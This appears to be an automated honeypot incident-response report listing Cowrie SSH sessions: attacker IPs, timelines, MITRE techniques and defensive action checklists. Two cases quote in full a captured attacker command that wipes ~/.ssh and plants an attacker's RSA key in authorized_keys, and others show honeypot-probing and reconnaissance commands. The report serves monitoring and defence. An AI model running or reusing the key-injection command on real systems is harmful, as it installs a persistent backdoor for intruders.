| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_6e120c6b5873995fe2ffe604bee2038f_small_control'"'"' '"'"'check_6e120c6b5873995fe2ffe604bee2038f'"'"'', printf '\n%s|%s\n' 'check_6e120c6b5873995fe2ffe604bee2038f_small_control' 'check_6e120c6b5873995fe2ffe604bee2038f', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_6e120c6b5873995fe2ffe604bee2038f_small_math'"'"' "$((263*207+49))"', (263*207+49, printf '\n%s|%s\n' 'check_6e120c6b5873995fe2ffe604bee2038f_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-11 03:16:37` | `cowrie.session.connect` |
| `2026-11-11 03:16:38` | `cowrie.client.version` |
| `2026-11-11 03:16:38` | `cowrie.client.kex` |
| `2026-11-11 03:16:43` | `cowrie.login.success` |
| `2026-11-11 03:16:46` | `cowrie.client.size` |
| `2026-11-11 03:16:47` | `cowrie.session.params` |
| `2026-11-11 03:16:51` | `cowrie.command.input` |
| `2026-11-11 03:16:51` | `cowrie.command.input` |
| `2026-11-11 03:16:51` | `cowrie.command.input` |
| `2026-11-11 03:16:51` | `cowrie.command.input` |
| `2026-11-11 03:16:51` | `cowrie.command.input` |
| `2026-11-11 03:16:51` | `cowrie.command.input` |
| `2026-11-11 03:16:51` | `cowrie.command.input` |
| `2026-11-11 03:16:51` | `cowrie.command.input` |
| `2026-11-11 03:16:51` | `cowrie.command.input` |
| … | _47 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-742f6bcb52cc

| Field | Detail |
|---|---|
| **Source IP** | `20.219.91[.]90` |
| **First Seen** | 2026-11-11 03:18 |
| **Last Seen** | 2026-11-11 03:18 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-11 03:18:13` | `cowrie.session.connect` |
| `2026-11-11 03:18:13` | `cowrie.client.version` |
| `2026-11-11 03:18:14` | `cowrie.client.kex` |
| `2026-11-11 03:18:14` | `cowrie.login.success` |
| `2026-11-11 03:18:15` | `cowrie.session.params` |
| `2026-11-11 03:18:15` | `cowrie.command.input` |
| `2026-11-11 03:18:15` | `cowrie.command.failed` |
| `2026-11-11 03:18:16` | `cowrie.log.closed` |
| `2026-11-11 03:18:17` | `cowrie.session.params` |
| `2026-11-11 03:18:17` | `cowrie.command.input` |
| `2026-11-11 03:18:17` | `cowrie.session.file_download` |
| `2026-11-11 03:18:17` | `cowrie.log.closed` |
| `2026-11-11 03:18:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.219.91[.]90` to AbuseIPDB if not already reported
- [ ] Block `20.219.91[.]90` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fa8e6c044ffd

| Field | Detail |
|---|---|
| **Source IP** | `20.219.91[.]90` |
| **First Seen** | 2026-11-11 03:18 |
| **Last Seen** | 2026-11-11 03:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-11 03:18:17` | `cowrie.session.connect` |
| `2026-11-11 03:18:17` | `cowrie.client.version` |
| `2026-11-11 03:18:17` | `cowrie.client.kex` |
| `2026-11-11 03:18:18` | `cowrie.login.success` |
| `2026-11-11 03:18:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.219.91[.]90` to AbuseIPDB if not already reported
- [ ] Block `20.219.91[.]90` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-70227f76febc

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-11-11 03:18 |
| **Last Seen** | 2026-11-11 03:19 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_e3ded1d25adbe4126a215c09df95df1e_small_control'"'"' '"'"'check_e3ded1d25adbe4126a215c09df95df1e'"'"'', printf '\n%s|%s\n' 'check_e3ded1d25adbe4126a215c09df95df1e_small_control' 'check_e3ded1d25adbe4126a215c09df95df1e', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_e3ded1d25adbe4126a215c09df95df1e_small_math'"'"' "$((509*201+38))"', (509*201+38, printf '\n%s|%s\n' 'check_e3ded1d25adbe4126a215c09df95df1e_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-11 03:18:58` | `cowrie.session.connect` |
| `2026-11-11 03:18:59` | `cowrie.client.version` |
| `2026-11-11 03:18:59` | `cowrie.client.kex` |
| `2026-11-11 03:19:06` | `cowrie.login.success` |
| `2026-11-11 03:19:09` | `cowrie.client.size` |
| `2026-11-11 03:19:10` | `cowrie.session.params` |
| `2026-11-11 03:19:11` | `cowrie.command.input` |
| `2026-11-11 03:19:11` | `cowrie.command.input` |
| `2026-11-11 03:19:11` | `cowrie.command.input` |
| `2026-11-11 03:19:11` | `cowrie.command.input` |
| `2026-11-11 03:19:11` | `cowrie.command.input` |
| `2026-11-11 03:19:11` | `cowrie.command.input` |
| `2026-11-11 03:19:11` | `cowrie.command.input` |
| `2026-11-11 03:19:11` | `cowrie.command.input` |
| `2026-11-11 03:19:11` | `cowrie.command.input` |
| … | _47 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4b17358344d2

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-11-11 03:21 |
| **Last Seen** | 2026-11-11 03:21 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_a0bea82f21f5a1387ec2917da67920e5_small_control'"'"' '"'"'check_a0bea82f21f5a1387ec2917da67920e5'"'"'', printf '\n%s|%s\n' 'check_a0bea82f21f5a1387ec2917da67920e5_small_control' 'check_a0bea82f21f5a1387ec2917da67920e5', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_a0bea82f21f5a1387ec2917da67920e5_small_math'"'"' "$((274*443+23))"', (274*443+23, printf '\n%s|%s\n' 'check_a0bea82f21f5a1387ec2917da67920e5_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-11 03:21:11` | `cowrie.session.connect` |
| `2026-11-11 03:21:13` | `cowrie.client.version` |
| `2026-11-11 03:21:13` | `cowrie.client.kex` |
| `2026-11-11 03:21:18` | `cowrie.login.success` |
| `2026-11-11 03:21:21` | `cowrie.client.size` |
| `2026-11-11 03:21:23` | `cowrie.session.params` |
| `2026-11-11 03:21:24` | `cowrie.command.input` |
| `2026-11-11 03:21:24` | `cowrie.command.input` |
| `2026-11-11 03:21:24` | `cowrie.command.input` |
| `2026-11-11 03:21:24` | `cowrie.command.input` |
| `2026-11-11 03:21:24` | `cowrie.command.input` |
| `2026-11-11 03:21:24` | `cowrie.command.input` |
| `2026-11-11 03:21:24` | `cowrie.command.input` |
| `2026-11-11 03:21:24` | `cowrie.command.input` |
| `2026-11-11 03:21:24` | `cowrie.command.input` |
| … | _47 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fa64b7855e0c

| Field | Detail |
|---|---|
| **Source IP** | `23.132.164[.]185` |
| **First Seen** | 2026-11-11 03:21 |
| **Last Seen** | 2026-11-11 03:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-11 03:21:52` | `cowrie.session.connect` |
| `2026-11-11 03:21:52` | `cowrie.client.version` |
| `2026-11-11 03:21:52` | `cowrie.client.kex` |
| `2026-11-11 03:21:52` | `cowrie.login.success` |
| `2026-11-11 03:21:53` | `cowrie.session.params` |
| `2026-11-11 03:21:53` | `cowrie.command.input` |
| `2026-11-11 03:21:53` | `cowrie.log.closed` |
| `2026-11-11 03:21:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `23.132.164[.]185` to AbuseIPDB if not already reported
- [ ] Block `23.132.164[.]185` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8e4c88435018

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-11-11 03:23 |
| **Last Seen** | 2026-11-11 03:24 |
| **Session Duration** | 31s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_58240d34a3c47a3d205919deb9c7a410_small_control'"'"' '"'"'check_58240d34a3c47a3d205919deb9c7a410'"'"'', printf '\n%s|%s\n' 'check_58240d34a3c47a3d205919deb9c7a410_small_control' 'check_58240d34a3c47a3d205919deb9c7a410', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_58240d34a3c47a3d205919deb9c7a410_small_math'"'"' "$((631*408+61))"', (631*408+61, printf '\n%s|%s\n' 'check_58240d34a3c47a3d205919deb9c7a410_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-11 03:23:31` | `cowrie.session.connect` |
| `2026-11-11 03:23:32` | `cowrie.client.version` |
| `2026-11-11 03:23:32` | `cowrie.client.kex` |
| `2026-11-11 03:23:47` | `cowrie.login.success` |
| `2026-11-11 03:23:52` | `cowrie.client.size` |
| `2026-11-11 03:23:53` | `cowrie.session.params` |
| `2026-11-11 03:23:55` | `cowrie.command.input` |
| `2026-11-11 03:23:55` | `cowrie.command.input` |
| `2026-11-11 03:23:55` | `cowrie.command.input` |
| `2026-11-11 03:23:55` | `cowrie.command.input` |
| `2026-11-11 03:23:55` | `cowrie.command.input` |
| `2026-11-11 03:23:55` | `cowrie.command.input` |
| `2026-11-11 03:23:55` | `cowrie.command.input` |
| `2026-11-11 03:23:55` | `cowrie.command.input` |
| `2026-11-11 03:23:55` | `cowrie.command.input` |
| … | _47 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-544dc322421f

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-11-11 03:24 |
| **Last Seen** | 2026-11-11 03:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-11 03:24:24` | `cowrie.session.connect` |
| `2026-11-11 03:24:24` | `cowrie.client.version` |
| `2026-11-11 03:24:24` | `cowrie.client.kex` |
| `2026-11-11 03:24:24` | `cowrie.login.success` |
| `2026-11-11 03:24:24` | `cowrie.direct-tcpip.request` |
| `2026-11-11 03:24:24` | `cowrie.direct-tcpip.data` |
| `2026-11-11 03:24:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a3be3661a1d3

| Field | Detail |
|---|---|
| **Source IP** | `175.11.171[.]13` |
| **First Seen** | 2026-11-11 03:25 |
| **Last Seen** | 2026-11-11 03:30 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-11 03:25:23` | `cowrie.session.connect` |
| `2026-11-11 03:25:23` | `cowrie.client.version` |
| `2026-11-11 03:25:23` | `cowrie.client.kex` |
| `2026-11-11 03:25:24` | `cowrie.login.success` |
| `2026-11-11 03:30:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `175.11.171[.]13` to AbuseIPDB if not already reported
- [ ] Block `175.11.171[.]13` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bbcfb0dcca89

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-11-11 03:25 |
| **Last Seen** | 2026-11-11 03:25 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_b04301d048dabeb3c0bbd27da20994e5_small_control'"'"' '"'"'check_b04301d048dabeb3c0bbd27da20994e5'"'"'', printf '\n%s|%s\n' 'check_b04301d048dabeb3c0bbd27da20994e5_small_control' 'check_b04301d048dabeb3c0bbd27da20994e5', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_b04301d048dabeb3c0bbd27da20994e5_small_math'"'"' "$((259*465+19))"', (259*465+19, printf '\n%s|%s\n' 'check_b04301d048dabeb3c0bbd27da20994e5_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-11 03:25:29` | `cowrie.session.connect` |
| `2026-11-11 03:25:30` | `cowrie.client.version` |
| `2026-11-11 03:25:30` | `cowrie.client.kex` |
| `2026-11-11 03:25:36` | `cowrie.login.success` |
| `2026-11-11 03:25:39` | `cowrie.client.size` |
| `2026-11-11 03:25:40` | `cowrie.session.params` |
| `2026-11-11 03:25:41` | `cowrie.command.input` |
| `2026-11-11 03:25:41` | `cowrie.command.input` |
| `2026-11-11 03:25:41` | `cowrie.command.input` |
| `2026-11-11 03:25:41` | `cowrie.command.input` |
| `2026-11-11 03:25:41` | `cowrie.command.input` |
| `2026-11-11 03:25:41` | `cowrie.command.input` |
| `2026-11-11 03:25:41` | `cowrie.command.input` |
| `2026-11-11 03:25:41` | `cowrie.command.input` |
| `2026-11-11 03:25:41` | `cowrie.command.input` |
| … | _47 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d3a39f537863

| Field | Detail |
|---|---|
| **Source IP** | `103.102.46[.]200` |
| **First Seen** | 2026-11-11 03:27 |
| **Last Seen** | 2026-11-11 03:27 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-11 03:27:27` | `cowrie.session.connect` |
| `2026-11-11 03:27:28` | `cowrie.client.version` |
| `2026-11-11 03:27:28` | `cowrie.client.kex` |
| `2026-11-11 03:27:32` | `cowrie.login.success` |
| `2026-11-11 03:27:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.102.46[.]200` to AbuseIPDB if not already reported
- [ ] Block `103.102.46[.]200` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d047b28d61f2

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-11-11 03:27 |
| **Last Seen** | 2026-11-11 03:28 |
| **Session Duration** | 35s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_6c42899c0c3932150ea58772a4739b68_small_control'"'"' '"'"'check_6c42899c0c3932150ea58772a4739b68'"'"'', printf '\n%s|%s\n' 'check_6c42899c0c3932150ea58772a4739b68_small_control' 'check_6c42899c0c3932150ea58772a4739b68', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_6c42899c0c3932150ea58772a4739b68_small_math'"'"' "$((796*544+70))"', (796*544+70, printf '\n%s|%s\n' 'check_6c42899c0c3932150ea58772a4739b68_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-11 03:27:54` | `cowrie.session.connect` |
| `2026-11-11 03:27:56` | `cowrie.client.version` |
| `2026-11-11 03:27:56` | `cowrie.client.kex` |
| `2026-11-11 03:28:08` | `cowrie.login.success` |
| `2026-11-11 03:28:11` | `cowrie.client.size` |
| `2026-11-11 03:28:14` | `cowrie.session.params` |
| `2026-11-11 03:28:15` | `cowrie.command.input` |
| `2026-11-11 03:28:15` | `cowrie.command.input` |
| `2026-11-11 03:28:15` | `cowrie.command.input` |
| `2026-11-11 03:28:15` | `cowrie.command.input` |
| `2026-11-11 03:28:15` | `cowrie.command.input` |
| `2026-11-11 03:28:15` | `cowrie.command.input` |
| `2026-11-11 03:28:15` | `cowrie.command.input` |
| `2026-11-11 03:28:15` | `cowrie.command.input` |
| `2026-11-11 03:28:15` | `cowrie.command.input` |
| … | _47 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-62f2f46ad3b2

| Field | Detail |
|---|---|
| **Source IP** | `108.174.147[.]36` |
| **First Seen** | 2026-11-11 03:44 |
| **Last Seen** | 2026-11-11 03:44 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-11 03:44:10` | `cowrie.session.connect` |
| `2026-11-11 03:44:10` | `cowrie.client.version` |
| `2026-11-11 03:44:10` | `cowrie.client.kex` |
| `2026-11-11 03:44:11` | `cowrie.login.success` |
| `2026-11-11 03:44:11` | `cowrie.session.params` |
| `2026-11-11 03:44:11` | `cowrie.command.input` |
| `2026-11-11 03:44:11` | `cowrie.command.failed` |
| `2026-11-11 03:44:12` | `cowrie.log.closed` |
| `2026-11-11 03:44:12` | `cowrie.session.params` |
| `2026-11-11 03:44:12` | `cowrie.command.input` |
| `2026-11-11 03:44:13` | `cowrie.session.file_download` |
| `2026-11-11 03:44:13` | `cowrie.log.closed` |
| `2026-11-11 03:44:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `108.174.147[.]36` to AbuseIPDB if not already reported
- [ ] Block `108.174.147[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4792dad98fd4

| Field | Detail |
|---|---|
| **Source IP** | `108.174.147[.]36` |
| **First Seen** | 2026-11-11 03:44 |
| **Last Seen** | 2026-11-11 03:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-11 03:44:13` | `cowrie.session.connect` |
| `2026-11-11 03:44:13` | `cowrie.client.version` |
| `2026-11-11 03:44:13` | `cowrie.client.kex` |
| `2026-11-11 03:44:13` | `cowrie.login.success` |
| `2026-11-11 03:44:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `108.174.147[.]36` to AbuseIPDB if not already reported
- [ ] Block `108.174.147[.]36` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### Additional priority cases (202) — compact view

| Case | Severity | Source IP | First Seen | Auth | Cmds | DL | TTPs |
|---|---|---|---|---|---|---|---|
| IR-c70718eb04d3 | HIGH | `193.32.162[.]15` | 2026-11-11 03:56 | Y | 0 | 0 | `T1078 · T1592` |
| IR-2d05e717563b | HIGH | `80.94.95[.]118` | 2026-11-11 04:06 | Y | 0 | 0 | `T1078 · T1592` |
| IR-e9f522fbe962 | HIGH | `80.94.92[.]179` | 2026-11-11 04:14 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-ab4978f57256 | HIGH | `80.94.92[.]179` | 2026-11-11 04:16 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-82a572e1b48c | HIGH | `80.94.92[.]179` | 2026-11-11 04:19 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-451df2655056 | HIGH | `80.94.92[.]179` | 2026-11-11 04:21 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-1134384953b7 | HIGH | `80.94.92[.]179` | 2026-11-11 04:23 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-e79623d9efb9 | HIGH | `80.94.92[.]179` | 2026-11-11 04:26 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-e7fe9e4b56f7 | HIGH | `104.244.79[.]113` | 2026-11-11 04:27 | Y | 0 | 0 | `T1078 · T1592` |
| IR-d94f0861a954 | HIGH | `80.94.92[.]179` | 2026-11-11 04:30 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-9eaac40810d3 | HIGH | `80.94.92[.]179` | 2026-11-11 04:32 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-dc86b650535c | HIGH | `35.210.198[.]246` | 2026-11-11 04:33 | Y | 0 | 0 | `T1078 · T1592` |
| IR-4be50278884c | HIGH | `80.94.92[.]179` | 2026-11-11 04:34 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-d675e0d53823 | HIGH | `80.94.92[.]179` | 2026-11-11 04:37 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-5eb7ddcd08c1 | HIGH | `80.94.92[.]179` | 2026-11-11 04:39 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-69ed55dfc619 | HIGH | `80.94.92[.]179` | 2026-11-11 04:41 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-9d840e2f7bec | HIGH | `80.94.92[.]179` | 2026-11-11 04:43 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-441ce05d0590 | HIGH | `80.94.92[.]179` | 2026-11-11 04:45 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-0588f4872549 | HIGH | `80.94.92[.]179` | 2026-11-11 04:48 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-80758c2b7b53 | HIGH | `80.94.92[.]179` | 2026-11-11 04:50 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-abc20a2195de | HIGH | `103.102.46[.]200` | 2026-11-11 04:53 | Y | 0 | 0 | `T1078 · T1592` |
| IR-608b25e8cd81 | HIGH | `193.32.162[.]15` | 2026-11-11 04:53 | Y | 0 | 0 | `T1078 · T1592` |
| IR-d0ab3a36f940 | HIGH | `121.242.232[.]147` | 2026-11-11 05:08 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-35c7102eb80e | HIGH | `121.242.232[.]147` | 2026-11-11 05:08 | Y | 0 | 0 | `T1078 · T1592` |
| IR-423722d41c3d | HIGH | `109.160.32[.]138` | 2026-11-11 05:10 | Y | 1 | 0 | `T1078 · T1592` |
| IR-17dac6931219 | HIGH | `129.121.140[.]56` | 2026-11-11 05:22 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-a50036f2fd2c | HIGH | `129.121.140[.]56` | 2026-11-11 05:22 | Y | 0 | 0 | `T1078 · T1592` |
| IR-26a97d88b80e | HIGH | `176.53.159[.]196` | 2026-11-11 05:26 | Y | 0 | 0 | `T1078 · T1592` |
| IR-5ac80c1dc8ad | HIGH | `182.61.33[.]68` | 2026-11-11 05:47 | Y | 2 | 0 | `T1021.004 · T1078 · T1592` |
| IR-6e5b4b187cef | HIGH | `182.61.33[.]68` | 2026-11-11 05:47 | Y | 0 | 0 | `T1078 · T1592` |
| IR-c160960f977a | HIGH | `81.192.46[.]49` | 2026-11-11 05:53 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-f795765d7463 | HIGH | `81.192.46[.]49` | 2026-11-11 05:53 | Y | 0 | 0 | `T1078 · T1592` |
| IR-5d8a8765f6eb | HIGH | `78.128.112[.]74` | 2026-11-11 05:57 | Y | 1 | 0 | `T1078 · T1592` |
| IR-de64b0e5b0e2 | HIGH | `109.160.32[.]138` | 2026-11-11 06:00 | Y | 1 | 0 | `T1078 · T1592` |
| IR-5e14f39cb7b5 | HIGH | `134.209.232[.]191` | 2026-11-11 06:06 | Y | 0 | 0 | `T1078` |
| IR-08ae3dc9fbd9 | HIGH | `134.209.232[.]191` | 2026-11-11 06:07 | Y | 8 | 0 | `T1078` |
| IR-7349dcdfb0f6 | HIGH | `165.22.85[.]220` | 2026-11-11 06:08 | Y | 2 | 0 | `T1078` |
| IR-c178fa11048b | HIGH | `164.90.219[.]112` | 2026-11-11 06:08 | Y | 3 | 0 | `T1078` |
| IR-6c20af2a8f3a | HIGH | `103.159.2[.]113` | 2026-11-11 06:10 | Y | 1 | 0 | `T1078 · T1592` |
| IR-97c6e62fae23 | HIGH | `35.210.136[.]244` | 2026-11-11 06:12 | Y | 0 | 0 | `T1078 · T1592` |
| IR-9eebb0600b66 | HIGH | `103.102.46[.]200` | 2026-11-11 06:20 | Y | 0 | 0 | `T1078 · T1592` |
| IR-42a2e112c6a1 | HIGH | `176.53.159[.]196` | 2026-11-11 06:28 | Y | 0 | 0 | `T1078 · T1592` |
